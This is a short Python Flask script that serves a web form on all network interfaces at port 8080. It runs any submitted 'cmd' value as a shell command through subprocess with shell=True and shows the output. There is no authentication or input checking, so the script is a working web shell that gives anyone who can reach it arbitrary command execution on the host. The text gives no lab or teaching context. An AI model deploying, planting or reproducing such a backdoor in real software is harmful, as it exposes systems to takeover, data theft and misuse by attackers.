from flask import Flask, request
import os
import subprocess

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def run():
    if request.method == 'POST':
        cmd = request.form.get('cmd')
        result = subprocess.check_output(cmd, shell=True).decode()
        return f"<pre>{result}</pre><form method='POST'><input name='cmd'><input type='submit'></form>"
    return "<form method='POST'><input name='cmd'><input type='submit'></form>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
